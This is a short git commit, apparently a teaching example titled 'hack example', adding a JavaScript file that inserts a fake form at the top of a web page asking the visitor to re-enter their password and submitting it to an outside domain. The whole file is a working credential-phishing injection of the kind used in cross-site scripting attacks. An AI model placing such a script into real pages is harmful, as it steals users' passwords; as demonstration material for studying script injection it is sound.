cc5806e1bb134ec21b3e515f6d5807e84e226154
Brad Westfall <brad@azpixels.com>
2014-07-10 11:51:40 -0700

    hack example

---
+++ hack.js
@@ -0,0 +1,15 @@
+function create(htmlStr) {
+    var frag = document.createDocumentFragment(),
+        temp = document.createElement('div');
+    temp.innerHTML = htmlStr;
+    while (temp.firstChild) {
+        frag.appendChild(temp.firstChild);
+    }
+    return frag;
+}
+
+var body = document.querySelector('body');
+var fragment = create('<form action="http://www.azpixels.com">Please give us your password again<br><input name="password" type="password"><button>Submit</button></form>');
+
+body.insertBefore(fragment, body.firstChild);
+
